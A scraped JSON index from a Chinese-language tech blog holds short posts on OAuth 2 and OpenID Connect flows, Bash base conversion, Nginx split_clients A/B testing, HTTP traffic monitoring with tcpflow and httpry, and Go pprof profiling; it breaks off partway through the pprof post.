用户名密码模式，这种流程相对来说，比较适用于可信任的客户端，例如自家研发的客户端，客户端要求用户输入用户名和密码，之后 向服务器请求，服务区校验用户名密码之后，下发 access_token\n+----------+ | Resource | | Owner | | | +----------+ v | Resource Owner (A) Password Credentials | v +---------+ +---------------+ | |\u0026gt;--(B)---- Resource Owner -------\u0026gt;| | | | Password Credentials | Authorization | | Client | | Server | | |\u0026lt;--(C)---- Access Token ---------\u0026lt;| | | | (w/ Optional Refresh Token) | | +---------+ +---------------+ Figure 5: Resource Owner Password Credentials Flow The flow illustrated in Figure 5 includes the following steps: (A) The resource owner provides the client with its username and password. (B) The client requests an access token from the authorization server\u0026#39;s token endpoint by including the credentials received from the resource owner. When making the request, the client authenticates with the authorization server. (C) The authorization server authenticates the client and validates the resource owner credentials, and if valid, issues an access token. Implicit Grant Implicit Grant 模式，适用于不方便暴露 client_secret 的地方，比如浏览器端（网页），分发出去的 App，都属于容易被逆向的程序， 这种情况就可以使用 Implicit Grant\n以最开始我们的例子，Slack 弹出 webview，加载 Google 的授权页面，Google 显示选择对应帐号，下面会提示会让客户端读取 用户信息，当用户点击确认之后，Google 校验完毕，会将页面重定向到客户端指定的地址，并且在 URL fragment 中带上 access_token。\n+----------+ | Resource | | Owner | | | +----------+ ^ | (B) +----|-----+ Client Identifier +---------------+ | -+----(A)-- \u0026amp; Redirection URI ---\u0026gt;| | | User- | | Authorization | | Agent -|----(B)-- User authenticates --\u0026gt;| Server | | | | | | |\u0026lt;---(C)--- Redirection URI ----\u0026lt;| | | | with Access Token +---------------+ | | in Fragment | | +---------------+ | |----(D)--- Redirection URI ----\u0026gt;| Web-Hosted | | | without Fragment | Client | | | | Resource | | (F) |\u0026lt;---(E)------- Script ---------\u0026lt;| | | | +---------------+ +-|--------+ | | (A) (G) Access Token | | ^ v +---------+ | | | Client | | | +---------+ Note: The lines illustrating steps (A) and (B) are broken into two parts as they pass through the user-agent. Figure 4: Implicit Grant Flow The flow illustrated in Figure 4 includes the following steps: (A) The client initiates the flow by directing the resource owner\u0026#39;s user-agent to the authorization endpoint. The client includes its client identifier, requested scope, local state, and a redirection URI to which the authorization server will send the user-agent back once access is granted (or denied). (B) The authorization server authenticates the resource owner (via the user-agent) and establishes whether the resource owner grants or denies the client\u0026#39;s access request. (C) Assuming the resource owner grants access, the authorization server redirects the user-agent back to the client using the redirection URI provided earlier. The redirection URI includes the access token in the URI fragment. (D) The user-agent follows the redirection instructions by making a request to the web-hosted client resource (which does not include the fragment per [RFC2616]). The user-agent retains the fragment information locally. (E) The web-hosted client resource returns a web page (typically an HTML document with an embedded script) capable of accessing the full redirection URI including the fragment retained by the user-agent, and extracting the access token (and other parameters) contained in the fragment. (F) The user-agent executes the script provided by the web-hosted client resource locally, which extracts the access token. (G) The user-agent passes the access token to the client. Authorization Code Grant Authorization Code 模式，这是最复杂，也是最安全的一种授权模式\n首先 Slack 客户端打开 webview，加载 Google 的授权页面，并且指定模式为 Authorization Code，Google 让用户确认之后，重定向 回 Slack 指定的 URL，并且在参数中附带一个参数，叫做 code，随后 Slack 的服务端拿着 code，带上 client_id, client_secret 再次请求 Google，此时 Google 校验 token，如成功，则下发 access_token。由于是 Slack 的服务器直接请求获得的 token，因此会 比前面三种都更加安全。\n+----------+ | Resource | | Owner | | | +----------+ ^ | (B) +----|-----+ Client Identifier +---------------+ | -+----(A)-- \u0026amp; Redirection URI ----\u0026gt;| | | User- | | Authorization | | Agent -+----(B)-- User authenticates ---\u0026gt;| Server | | | | | | -+----(C)-- Authorization Code ---\u0026lt;| | +-|----|---+ +---------------+ | | ^ v (A) (C) | | | | | | ^ v | | +---------+ | | | |\u0026gt;---(D)-- Authorization Code ---------\u0026#39; | | Client | \u0026amp; Redirection URI | | | | | |\u0026lt;---(E)----- Access Token -------------------\u0026#39; +---------+ (w/ Optional Refresh Token) Note: The lines illustrating steps (A), (B), and (C) are broken into two parts as they pass through the user-agent. Figure 3: Authorization Code Flow The flow illustrated in Figure 3 includes the following steps: (A) The client initiates the flow by directing the resource owner\u0026#39;s user-agent to the authorization endpoint. The client includes its client identifier, requested scope, local state, and a redirection URI to which the authorization server will send the user-agent back once access is granted (or denied). (B) The authorization server authenticates the resource owner (via the user-agent) and establishes whether the resource owner grants or denies the client\u0026#39;s access request. (C) Assuming the resource owner grants access, the authorization server redirects the user-agent back to the client using the redirection URI provided earlier (in the request or during client registration). The redirection URI includes an authorization code and any local state provided by the client earlier. (D) The client requests an access token from the authorization server\u0026#39;s token endpoint by including the authorization code received in the previous step. When making the request, the client authenticates with the authorization server. The client includes the redirection URI used to obtain the authorization code for verification. (E) The authorization server authenticates the client, validates the authorization code, and ensures that the redirection URI received matches the URI used to redirect the client in step (C). If valid, the authorization server responds back with an access token and, optionally, a refresh token. Authorization Code PKCE 扩展 这个模式，和 Authorization Code 基本相同，不同的地方在于不暴露 client_secret，因此可以用于浏览器等。流程如下：\n首先浏览器生成随机字符串，我们称之为 code_verifier，长度限制在 43-128 字符 随后，我们将 code_verifier 做 sha256 加密，然后做 URL safe base64 encode，得到的字符我们称为 code_challenge 接着，客户端打开授权服务器的页面，并且在参数中附带 code_challenge=巴拉巴拉巴拉\u0026amp;code_challenge_method=S256， code_challenge 是第二步中生成的，code_challenge_method 指定哈希方法，S256 指的是 sha256，授权服务器将这些信息记录下来 随后服务器提示用户是否授权，当用户授权之后，服务器回调浏览器指定的 URL，并且带上 code 客户端将 code 提取出来，然后请求授权服务器，并且带上 code 和 code_verifier 授权服务器提取请求中的 code_verifier，将其做 sha256，并且与第三步中的 code_challenge 进行对比，如果一致，则说明授权 成功，于是下发 access_token\nJWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c 其实就是三部分：\nHeader，指示 token 类型和签名算法 Payload，包含了真正有用的信息，通常也叫做 claims Signature，这是 Header 和 Payload 进行签名之后的结果 OpenID Connect(OIDC) OIDC 主要的目的在于登录用户，获取用户信息，而不是获取其它权限。前面我们说了，OIDC 基于 OAuth 2， 因此，OIDC 可以使用 Authorization Code 模式，也可以使用 Implicit 模式，还有一种 Hybrid 模式。\n通过 OIDC，我们可以以第三方系统的身份来登录另外一个系统，并且获取一些基本的资料，例如 first name, last name, username, email, avatar url 等。\nAuthentication using the Authorization Code Flow The Authorization Code Flow goes through the following steps:\nClient prepares an Authentication Request containing the desired request parameters. Client sends the request to the Authorization Server. Authorization Server Authenticates the End-User. Authorization Server obtains End-User Consent/Authorization. Authorization Server sends the End-User back to the Client with an Authorization Code. Client requests a response using the Authorization Code at the Token Endpoint. Client receives a response that contains an ID Token and Access Token in the response body. Client validates the ID token and retrieves the End-User\u0026rsquo;s Subject Identifier. 基本就是 OAuth 2 Authorization Code 模式的流程，区别在于，在 scope 参数中，一定有一项叫做 openid，另外一点就在于最终 的返回结果里，多了一项 id_token\n{ \u0026#34;access_token\u0026#34;: \u0026#34;SlAV32hkKG\u0026#34;, \u0026#34;token_type\u0026#34;: \u0026#34;Bearer\u0026#34;, \u0026#34;refresh_token\u0026#34;: \u0026#34;8xLOxBtZp8\u0026#34;, \u0026#34;expires_in\u0026#34;: 3600, \u0026#34;id_token\u0026#34;: \u0026#34;eyJhbGciOiJSUzI1NiIsImtpZCI6IjFlOWdkazcifQ.ewogImlzc yI6ICJodHRwOi8vc2VydmVyLmV4YW1wbGUuY29tIiwKICJzdWIiOiAiMjQ4Mjg5 NzYxMDAxIiwKICJhdWQiOiAiczZCaGRSa3F0MyIsCiAibm9uY2UiOiAibi0wUzZ fV3pBMk1qIiwKICJleHAiOiAxMzExMjgxOTcwLAogImlhdCI6IDEzMTEyODA5Nz AKfQ.ggW8hZ1EuVLuxNuuIJKX_V8a_OMXzR0EHR9R6jgdqrOOF4daGU96Sr_P6q Jp6IcmD3HP99Obi1PRs-cwh3LO-p146waJ8IhehcwL7F09JdijmBqkvPeB2T9CJ NqeGpe-gccMg4vfKjkM8FcGvnzZUN4_KSP0aAp1tOJ1zZwgjxqGByKHiOtX7Tpd QyHE5lcMiKPXfEIQILVq0pc_E2DzL7emopWoaoZTF_m0_N0YzFC6g6EJbOEoRoS K5hoDalrcvRYLSrQAZZKflyuVCyixEoV9GfNQC3_osjzw2PAithfubEEBLuVVk4 XUVrWOLrLl0nx7RkKU8NXNHq-rvKMzqg\u0026#34; } id_token\n{ \u0026#34;iss\u0026#34;: \u0026#34;http://server.example.com\u0026#34;, \u0026#34;sub\u0026#34;: \u0026#34;248289761001\u0026#34;, \u0026#34;aud\u0026#34;: \u0026#34;s6BhdRkqt3\u0026#34;, \u0026#34;nonce\u0026#34;: \u0026#34;n-0S6_WzA2Mj\u0026#34;, \u0026#34;exp\u0026#34;: 1311281970, \u0026#34;iat\u0026#34;: 1311280970 } iss 是 Issuer 的缩写，值是颁发这个 OpenID 的 URL sub 是 Subject 的缩写，指的是这个 OpenID 对应的用户 aud 是 Audience(s) 的缩写，指的是这个 OpenID 所授权的 client id(可能有多个) exp 是 超时时间 iat 是 颁发时间 nonce 是随机字符串 Authentication using the Implicit Flow 步骤如下：\nClient prepares an Authentication Request containing the desired request parameters. Client sends the request to the Authorization Server. Authorization Server Authenticates the End-User. Authorization Server obtains End-User Consent/Authorization. Authorization Server sends the End-User back to the Client with an ID Token and, if requested, an Access Token. Client validates the ID token and retrieves the End-User\u0026rsquo;s Subject Identifier. 流程也基本和 OAuth 2 的 Implicit 模式一致，区别在于 response_type 的值不是 token，而是 id_token token 或者 id_token， 对于响应结果，也是会新增加一个 id_token 在 URL fragment 里。\nAuthentication using the Hybrid Flow 步骤如下：\nClient prepares an Authentication Request containing the desired request parameters. Client sends the request to the Authorization Server. Authorization Server Authenticates the End-User. Authorization Server obtains End-User Consent/Authorization. Authorization Server sends the End-User back to the Client with an Authorization Code and, depending on the Response Type, one or more additional parameters. Client requests a response using the Authorization Code at the Token Endpoint. Client receives a response that contains an ID Token and Access Token in the response body. Client validates the ID Token and retrieves the End-User\u0026rsquo;s Subject Identifier. 区别在于，请求参数中，response_type 的值是 code id_token 或 code token 或 code id_token token：\n当值是 code token 时，会返回 code, access_token 当值是 code id_token 时，会返回 code, id_token 当值是 code id_token token 时，会返回 code, id_token, access_token ","date":"July 6, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/20220706-openid-connect/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://jiajunhuang.com/articles/2022_07_06-openid_connect.md.html\" target=\"_blank\" rel=\"noopener\"\u003eOIDC(OpenID Connect) 简介\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"authentication-vs-authorization\"\u003eAuthentication vs. authorization\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003eAuthentication 通常是指校验是否是用户本人的这个过程，而 Authorization 则更多的是指用户是否有权限。通常我们都是先校验 是否是用户本人，然后再校验用户是否有权限。也就是先开始 Authentication，再开始 Authorization。\u003c/p\u003e\u003c/blockquote\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003eAuthentication\u003c/th\u003e\n          \u003cth\u003eAuthorization\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eDetermines whether users are who they claim to be\u003c/td\u003e\n          \u003ctd\u003eDetermines what users can and cannot access\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eChallenges the user to validate credentials (for example, through passwords, answers to security questions, or facial recognition)\u003c/td\u003e\n          \u003ctd\u003eVerifies whether access is allowed through policies and rules\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eUsually done before authorization\u003c/td\u003e\n          \u003ctd\u003eUsually done after successful authentication\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eGenerally, transmits info through an ID Token\u003c/td\u003e\n          \u003ctd\u003eGenerally, transmits info through an Access Token\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eGenerally governed by the OpenID Connect (OIDC) protocol\u003c/td\u003e\n          \u003ctd\u003eGenerally governed by the OAuth 2.0 framework\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eExample: Employees in a company are required to authenticate through the network before accessing their company email\u003c/td\u003e\n          \u003ctd\u003eExample: After an employee successfully authenticates, the system determines what information the employees are allowed to access\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 id=\"oauth-2\"\u003eOAuth 2\u003c/h3\u003e\n\u003ch4 id=\"client-credentials-grant\"\u003e\u003ca href=\"https://datatracker.ietf.org/doc/html/rfc6749#section-4.4\" target=\"_blank\" rel=\"noopener\"\u003eClient Credentials Grant\u003c/a\u003e\u003c/h4\u003e\n\u003cblockquote\u003e\n\u003cp\u003e这种模式是最简单的，其实就是客户端告诉服务端自己是哪个客户端，服务器就将 access_token 下发\u003c/p\u003e","tags":["URL","OIDC","Authentication","Authorization","OAuth"],"title":"OIDC(OpenID Connect) 简介"},{"categories":["URL","BASH"],"contents":" Bash Bitwise Operators Bash\u0026rsquo;s Tools for Base Conversion Bash\u0026rsquo;s arithmetic expansion allows us to write numbers in any base by prefixing the numeric digits of the base followed by the hash symbol. $ echo $((2#1001)) 9 bc allows us to convert effortlessly between bases, using the parameters ibase (for the input base) and obase (for the output base). So, let\u0026rsquo;s convert the decimal number 9 to base 2 $ echo \u0026#34;ibase=10;obase=2;9\u0026#34; | bc 1001 ","date":"July 4, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/20220704-bash-bitwise-operators/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.baeldung.com/linux/bash-bitwise-operators\" target=\"_blank\" rel=\"noopener\"\u003eBash Bitwise Operators\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"bashs-tools-for-base-conversion\"\u003eBash\u0026rsquo;s Tools for Base Conversion\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eBash\u0026rsquo;s arithmetic expansion allows us to write numbers in any base by prefixing the numeric digits of the base followed by the hash symbol.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ echo \u003cspan style=\"color:#66d9ef\"\u003e$((\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e2#1001\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e9\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003ebc allows us to convert effortlessly between bases, using the parameters ibase (for the input base) and obase (for the output base). So, let\u0026rsquo;s convert the decimal number 9 to base 2\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ibase=10;obase=2;9\u0026#34;\u003c/span\u003e | bc\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e1001\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","BASH"],"title":"Bash Bitwise Operators"},{"categories":["URL","NGINX","Testing"],"contents":" Nginx 使用 split_clients 进行简易 A/B 测试 ngx_http_split_clients_module configure 这里举例，我们想要 20% 的用户跳转到网址 https://example.com/，30% 的用户跳转到网址 https://example.org/，剩下的跳转到网址 https://examle.edu/\nsplit_clients \u0026#34;${remote_addr}AAA\u0026#34; $variant { 20% https://example.com/; 30% https://example.org/; * https://example.edu/; } server { listen 80; listen [::]:80; server_name _; return 302 ${variant}; } 上述例子中，按照访客请求的 IP 地址 加上 AAA 字符串 会使用 MurmurHash2 转换成数字，如果得出的数字在前 20%，那么 $variant 值为 https://example.com/，相应的在中间 30% 区间的值为 https://example.org/，其他的为 https://example.edu/。\n指定不同的目录 root /var/www/${variant}; 指定不同的首页 index index-${variant}.html; ","date":"July 4, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/20220704-nginx-ab-testing/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://u.sb/nginx-ab-testing/\" target=\"_blank\" rel=\"noopener\"\u003eNginx 使用 split_clients 进行简易 A/B 测试\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"ngx_\"\u003e\u003ca href=\"https://nginx.org/en/docs/http/ngx_http_split_clients_module.html\" target=\"_blank\" rel=\"noopener\"\u003engx_http_split_clients_module\u003c/a\u003e\u003c/h5\u003e\n\u003ch5 id=\"configure\"\u003econfigure\u003c/h5\u003e\n\u003cblockquote\u003e\n\u003cp\u003e这里举例，我们想要 20% 的用户跳转到网址 \u003ca href=\"https://example.com/\" target=\"_blank\" rel=\"noopener\"\u003ehttps://example.com/\u003c/a\u003e，30% 的用户跳转到网址 \u003ca href=\"https://example.org/\" target=\"_blank\" rel=\"noopener\"\u003ehttps://example.org/\u003c/a\u003e，剩下的跳转到网址 \u003ca href=\"https://examle.edu/\" target=\"_blank\" rel=\"noopener\"\u003ehttps://examle.edu/\u003c/a\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003esplit_clients\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e${remote_addr}AAA\u0026#34; $variant {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e20%\u003c/span\u003e               \u003cspan style=\"color:#e6db74\"\u003ehttps://example.com/\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e30%\u003c/span\u003e               \u003cspan style=\"color:#e6db74\"\u003ehttps://example.org/\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e                 \u003cspan style=\"color:#e6db74\"\u003ehttps://example.edu/\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eserver\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003elisten\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e80\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003elisten\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e[::]:80\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eserver_name\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e_\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e302\u003c/span\u003e ${variant};\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e上述例子中，按照访客请求的 IP 地址 加上 AAA 字符串 会使用 MurmurHash2 转换成数字，如果得出的数字在前 20%，那么 $variant 值为 \u003ca href=\"https://example.com/\" target=\"_blank\" rel=\"noopener\"\u003ehttps://example.com/\u003c/a\u003e，相应的在中间 30% 区间的值为 \u003ca href=\"https://example.org/\" target=\"_blank\" rel=\"noopener\"\u003ehttps://example.org/\u003c/a\u003e，其他的为 \u003ca href=\"https://example.edu/\" target=\"_blank\" rel=\"noopener\"\u003ehttps://example.edu/\u003c/a\u003e。\u003c/p\u003e\n\u003ch6 id=\"指定不同的目录\"\u003e指定不同的目录\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eroot\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/var/www/\u003c/span\u003e${variant};\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch6 id=\"指定不同的首页\"\u003e指定不同的首页\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eindex\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eindex-\u003c/span\u003e${variant}.html;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","NGINX","Testing"],"title":"Nginx 使用 split_clients 进行简易 A/B 测试"},{"categories":["URL","Linux","command line","HTTP","Network"],"contents":" Monitoring HTTP Requests on a Network Interface in Real Time tcpflow apt/dnf install tcpflow\n$ sudo tcpflow -p -c -i wlp0s20f3 port 80 | grep -oE \u0026#39;(GET|POST) .* HTTP/1.[01]|Host: .*\u0026#39; reportfilename: ./report.xml tcpflow: listening on wlp0s20f3 GET /alexlarsson/flatpak/ubuntu/dists/focal/InRelease HTTP/1.1 GET /mirrors.txt HTTP/1.1 -p disables promiscuous mode -c means only print the output to the console and don\u0026rsquo;t create files -i specifies the network interface grep receives the output of tcpflow -o means show only the matching parts of the lines that match the pattern -E means the pattern is an extended regular expression (ERE) httpry https://github.com/jbittel/httpry.git\nsudo httpry -i wlp0s20f3 httpry version 0.1.8 -- HTTP logging and information retrieval tool Copyright (c) 2005-2014 Jason Bittel \u0026lt;jason.bittel@gmail.com\u0026gt; Starting capture on wlp0s20f3 interface 2022-06-22 16:38:12.166\t192.168.1.24\t172.217.17.238\t\u0026gt;\tGET\tgoogle.com\t/\tHTTP/1.1\t-\t- 2022-06-22 16:38:12.199\t172.217.17.238\t192.168.1.24\t\u0026lt;\t-\t-\t-\tHTTP/1.0\t400\tBad Request 2022-06-22 16:38:23.090\t192.168.1.24\t172.217.17.238\t\u0026gt;\tPOST\tgoogle.com\t/\tHTTP/1.1\t-\t- 2022-06-22 16:38:23.163\t172.217.17.238\t192.168.1.24\t\u0026lt;\t-\t-\t-\tHTTP/1.1\t405\tMethod Not Allowed ","date":"June 23, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/20220623-monitoring-http-requests-network-interfaces/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.baeldung.com/linux/monitoring-http-requests-network-interfaces\" target=\"_blank\" rel=\"noopener\"\u003eMonitoring HTTP Requests on a Network Interface in Real Time\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"tcpflow\"\u003etcpflow\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ccode\u003eapt/dnf install tcpflow\u003c/code\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ sudo tcpflow -p -c -i wlp0s20f3 port \u003cspan style=\"color:#ae81ff\"\u003e80\u003c/span\u003e | grep -oE \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;(GET|POST) .* HTTP/1.[01]|Host: .*\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ereportfilename: ./report.xml\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etcpflow: listening on wlp0s20f3\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eGET /alexlarsson/flatpak/ubuntu/dists/focal/InRelease HTTP/1.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eGET /mirrors.txt HTTP/1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e-p\u003c/code\u003e disables promiscuous mode\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e-c\u003c/code\u003e means only print the output to the console and don\u0026rsquo;t create files\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e-i\u003c/code\u003e specifies the network interface\ngrep receives the output of tcpflow\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e-o\u003c/code\u003e means show only the matching parts of the lines that match the pattern\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e-E\u003c/code\u003e means the pattern is an extended regular expression (ERE)\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"httpry\"\u003ehttpry\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ccode\u003ehttps://github.com/jbittel/httpry.git\u003c/code\u003e\u003c/p\u003e","tags":["URL","Linux","command line","HTTP","Network"],"title":"Monitoring HTTP Requests on a Network Interface in Real Time"},{"categories":["URL","Go","pprof"],"contents":" golang pprof 实战 炸弹程序 package main import ( // 略 _ \u0026#34;net/http/pprof\u0026#34; // 会自动注册 handler 到 http server，方便通过 http 接口获取程序运行采样报告 // 略 ) func main() { // 略 runtime.GOMAXPROCS(1) // 限制 CPU 使用数，避免过载 runtime.SetMutexProfileFraction(1) // 开启对锁调用的跟踪 runtime.SetBlockProfileRate(1) // 开启对阻塞操作的跟踪 go func() { // 启动一个 http server，注意 pprof 相关的 handler 已经自动注册过了 // /debug/pprof/ if err := http.ListenAndServe(\u0026#34;:6060\u0026#34;, nil); err != nil { log.Fatal(err) } os.Exit(0) }() // 略 } http://localhost:6060/debug/pprof/ 类型 描述 备注 allocs 内存分配情况的采样信息 可以用浏览器打开，但可读性不高 blocks 阻塞操作情况的采样信息 可以用浏览器打开，但可读性不高 cmdline 显示程序启动命令及参数 可以用浏览器打开，这里会显示 ./go-pprof-practice goroutine 当前所有协程的堆栈信息 可以用浏览器打开，但可读性不高 heap 堆上内存使用情况的采样信息 可以用浏览器打开，但可读性不高 mutex 锁争用情况的采样信息 可以用浏览器打开，但可读性不高 profile CPU 占用情况的采样信息 浏览器打开会下载文件 threadcreate 系统线程创建情况的采样信息 可以用浏览器打开，但可读性不高 trace 程序运行跟踪信息 浏览器打开会下载文件，本文不涉及，可另行参阅《深入浅出 Go trace》 排查 CPU 占用过高\n可以看到 CPU 占用相当高，go tool pprof http://localhost:6060/debug/pprof/profile 进入一个交互式终端 输入 top 命令，查看 CPU 占用较高的调用 很明显，CPU 占用过高是 github.com/wolfogre/go-pprof-practice/animal/felidae/tiger.(*Tiger).Eat 造成的。 输入 list Eat，查看问题具体在代码的哪一个位置 可以看到，是第 24 行那个一百亿次空循环占用了大量 CPU 时间 接下来有一个扩展操作：图形化显示调用栈信息，这很酷，但是需要你事先在机器上安装 